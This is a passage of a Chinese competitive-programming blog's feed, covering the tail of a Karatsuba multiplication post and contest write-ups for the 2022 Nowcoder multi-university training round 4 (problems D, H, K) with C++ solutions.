class="title">karatsuba_mul</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *r = <span class="built_in">karatsuba_polymul</span>(LEN - <span class="number">1</span>, a, b);</span><br><span class="line">    <span class="built_in">memcpy</span>(c, r, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>) * LEN);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这样的实现存在一个问题：在 $b$ 进制下，多项式的每一个系数都有可能达到 $n \cdot b^2$ 量级，在压位高精度实现中可能造成整数溢出；而若在多项式乘法的过程中处理进位问题，则 $x_1 + x_0$ 与 $y_1 + y_0$ 的结果可能达到 $2 \cdot b^m$，增加一个位（如果采用 $x_1 - x_0$ 的计算方式，则不得不特殊处理负数的情况）。因此，需要依照实际的应用场景来决定采用何种实现方式。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来学学数学啦。    &lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="数学" scheme="http://example.com/categories/icpc/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="基础知识" scheme="http://example.com/categories/icpc/%E6%95%B0%E5%AD%A6/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>“蔚来杯”2022牛客暑期多校训练营4题解</title>
    <link href="http://example.com/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/</id>
    <published>2022-07-30T10:00:00.000Z</published>
    <updated>2022-07-31T10:08:55.038Z</updated>
    
    <content type="html"><![CDATA[<p>这把依然和 sigma 姐姐打这场多校。出了4题rank300多也还可以的，该罚坐的题还是罚坐，该做的也都做了。</p><span id="more"></span><h2 id="D-Jobs-Easy-Version"><a href="#D-Jobs-Easy-Version" class="headerlink" title="D. Jobs (Easy Version)"></a>D. Jobs (Easy Version)</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题就是说，有 $n$ 家公司，然后主人公有 $q$ 个朋友，每个公司有一定的职位，如果你至少符合一个公司的 $3Q(IQ,EQ,AQ)$ 要求，那么这家公司就会给你发 offer，然后问你这些朋友分别能拿多少 offer。这题防止读入量太大给你一个随机生成器去产生数据，最后还要求强制在线。</p><p>因为 3Q 的范围都比较小，然后当然我们就可以存一个最低的要求，因为我只用符合一个职位就可以了，我们最开始的想法是：开个数组：$dp[i][j][k][b]$ 表示第 $i$ 家公司 $IQ=j,EQ=k,AQ=b$ 能拿到多少职位。那么我们读入公司的职位要求然后先给当前点都 $+1$然后前缀以下，查询的时候只需要把相应的公司，3Q 输入下标查询是否为 0 即可，为 0 就说明没有 offer 嘛。</p><p>但是一算数据量发现编译器就阻拦住了，因此换一种思路，因为我们不需要知道一个人在一个公司能拿多少 offer 我们只关心拿没拿 offer，因此我们可以降维度去做。 $dp[i][j][k]$ 表示第 $i$ 家公司，$IQ=j,EQ=k$ 的情况下，能至少拿一个职位需要的最低 $AQ$。那么查询的时候我们只需要把 $i\ j\ k$ 给下标取出最低要求判断我的 $AQ$ 是否大于等于即可。然后就是抄随即发生器，在 $seed^{q-i}$ 可以写快速幂去算，最重要的一点：一定不要溢出，可以的话都开 long long 一定没事，或者为了提醒自己，时刻加上 <code>assert(v&gt;=0)</code> 至少提交的时候虽然浪费 20 罚时，但是你看到运行错误你就知道是溢出了，而不是一脸懵逼不知道哪里出错了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOD 998244353</span></span><br><span class="line"><span class="keyword">int</span> seed;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">10</span>][<span class="number">401</span>][<span class="number">401</span>];</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> base,<span class="keyword">int</span> exp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=base;exp;exp&gt;&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(exp&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans=(ans*k)%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        k=k*k%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dp));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> num,IQ,EQ,AQ;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=num;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;IQ,&amp;EQ,&amp;AQ);</span><br><span class="line">            dp[i][IQ][EQ]=<span class="built_in">min</span>(dp[i][IQ][EQ],AQ);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">400</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">400</span>;k++)&#123;</span><br><span class="line">                dp[i][j][k]=<span class="built_in">min</span>(dp[i][j][k],<span class="built_in">min</span>(dp[i][j][k<span class="number">-1</span>],dp[i][j<span class="number">-1</span>][k]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;seed);</span><br><span class="line">    <span class="function">std::mt19937 <span class="title">rng</span><span class="params">(seed)</span></span>;</span><br><span class="line">    std::uniform_int_distribution&lt;&gt;<span class="built_in">u</span>(<span class="number">1</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">int</span> lastans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> qans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> IQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> EQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> AQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d %d\n&quot;,IQ,EQ,AQ);</span></span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i][IQ][EQ]&lt;=AQ)&#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        lastans=ans;</span><br><span class="line">        qans+=lastans*<span class="built_in">qpow</span>(seed,m);</span><br><span class="line">        <span class="built_in">assert</span>(qans&gt;=<span class="number">0</span>);</span><br><span class="line">        qans%=MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,qans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="comment">//printf(&quot;%d&quot;,qpow(2,591));</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H-Wall-Builder-II"><a href="#H-Wall-Builder-II" class="headerlink" title="H. Wall Builder II"></a>H. Wall Builder II</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题的话是赛时我和 sigma 都写出来了的题目。自己还交错几发亏了点罚时，因为没看到说一定要矩形，以为可以任意形状的。就是说给你高度为1的砖头，长度为 1 的有 $n$ 块，长度为 $2$ 的有 $n-1$ 块……长度为 $n$ 的有一块。</p><p>容易发现不管怎么放面积十肯定不会变的，那么就变成了我们以前聊到的话题：面积相同的情况下周长怎么最短。那就是长宽接近的时候，因为这题面积不大，所以我们直接 $sqrt$ 往后寻找最大的较小因数作为高度，然后面积/高得到宽度。因为砖头块高为 1，所以我们每一行每一行考虑，不难发现我们先放大的，最后放小的一定能放下。根据这个贪心策略我们就可以很容易写出这题，因为要按顺序输出方案，最后再把方案总结起来然后排个序输出即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];<span class="comment">//,b[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> num[maxn];</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> line,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(length==<span class="number">0</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="built_in">min</span>(length,n);i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i])&#123;</span><br><span class="line">            q[line].<span class="built_in">push</span>(i);</span><br><span class="line">            num[i]--;</span><br><span class="line">            <span class="built_in">push</span>(line,length-i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y,x1,y1;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> pu&amp;a)&#123;</span><br><span class="line">        <span class="keyword">return</span> (x1-x)&lt;(a.x1-a.x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;b[<span class="number">200005</span>]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=(n+<span class="number">1</span>-i)*i;</span><br><span class="line">        num[i]=n+<span class="number">1</span>-i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k=(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> width=<span class="number">0</span>,height=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ans%i==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,i,ans/i);</span><br><span class="line">            height=i;</span><br><span class="line">            width=ans/i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*<span class="number">2</span>+height*<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=height;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,i,height);</span></span><br><span class="line">        <span class="built_in">push</span>(i,width);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=height;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> start=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(q[i].<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> len=q[i].<span class="built_in">front</span>();</span><br><span class="line">            q[i].<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">//    printf(&quot;%d %d %d %d\n&quot;,);</span></span><br><span class="line">            b[++cnt]=&#123;start,i<span class="number">-1</span>,start+len,i&#125;;</span><br><span class="line">            start+=len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(b+<span class="number">1</span>,b+<span class="number">1</span>+cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=cnt;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>,b[i].x,b[i].y,b[i].x1,b[i].y1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="sigma的题目分析"><a href="#sigma的题目分析" class="headerlink" title="sigma的题目分析"></a>sigma的题目分析</h3><p>利用公式 $\frac{n * (n + 1) * (n + 2)}{6} $得到面积，当面积确定时，最接近 $sqrt(s)$ 的长宽为让周长最小的方案。将较长的边作为底边，按照长度从大到小枚举所有砖头的插入方案，倒序输出即可。</p><p>也贴一下sigma姐姐的<a href="https://blog.csdn.net/laysan/article/details/126077861?spm=1001.2014.3001.5501">博客链接</a></p><h3 id="sigma的标程"><a href="#sigma的标程" class="headerlink" title="sigma的标程"></a>sigma的标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> len[N];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> x1, y1, x2, y2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vector&lt;node&gt; ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">int</span> s = n * (n + <span class="number">1</span>) * (n + <span class="number">2</span>) / <span class="number">6</span>;</span><br><span class="line">    ans.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;4&quot;</span> &lt;&lt; endl &lt;&lt; <span class="string">&quot;0 0 1 1&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (b = <span class="built_in">sqrt</span>(s); b &lt;= s; b++) &#123;</span><br><span class="line">        a = s / b;</span><br><span class="line">        <span class="keyword">if</span> (s % b == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="number">2</span> * (a + b) &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= b; i++) &#123;</span><br><span class="line">        len[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b)</span><br><span class="line">        <span class="built_in">swap</span>(a, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;                <span class="comment">//当前块的长度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n - i + <span class="number">1</span>; j++) &#123;    <span class="comment">//块数</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> lie = <span class="number">1</span>; lie &lt;= a; lie++) &#123;  <span class="comment">//枚举每列</span></span><br><span class="line">                <span class="keyword">if</span> (b - len[lie] &gt;= i) &#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;len[lie], lie - <span class="number">1</span>, len[lie] + i, lie&#125;);</span><br><span class="line">                    len[lie] += i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = ans.<span class="built_in">size</span>() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        cout &lt;&lt; ans[i].x1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ans[i].y1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ans[i].x2 &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">             &lt;&lt; ans[i].y2 &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>), cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> T = <span class="number">1</span>;</span><br><span class="line">    cin &gt;&gt; T;</span><br><span class="line">    <span class="keyword">while</span> (T--)</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="K-NIO’s-Sword"><a href="#K-NIO’s-Sword" class="headerlink" title="K. NIO’s Sword"></a>K. NIO’s Sword</h2><p>sigma姐姐做出来的！</p><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>初始时攻击力为 $0$，每次可以任意在攻击力之后添加一个数字，仅有在攻击力模 $n$ 与 $i$ 同余时才能够击杀第 $i$ 个敌人，问需要的最少升级次数。</p><p>暴力跑结论公式即可，注意特判 $n=1$ 时的情况。</p><p>警惕开场 $10$ 分钟暴力猜结论输入什么输出什么，喜提罚时。</p><h3 